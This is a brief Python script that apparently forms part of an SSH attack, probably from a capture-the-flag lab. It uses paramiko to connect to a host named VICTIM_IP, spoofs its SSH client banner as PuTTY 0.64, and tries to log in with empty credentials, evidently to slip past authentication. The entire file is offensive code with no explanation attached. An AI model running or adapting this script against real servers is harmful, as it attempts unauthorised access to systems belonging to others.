import paramiko

VICTIM_IP = "10.10.11.233"
CLIENT_ID = "PuTTY_Release_0.64"

def main():
    transport = paramiko.Transport(VICTIM_IP)
    transport.local_version = f"SSH-2.0-{CLIENT_ID}"
    transport.connect(username='', password='')

if __name__ == "__main__":
    main()
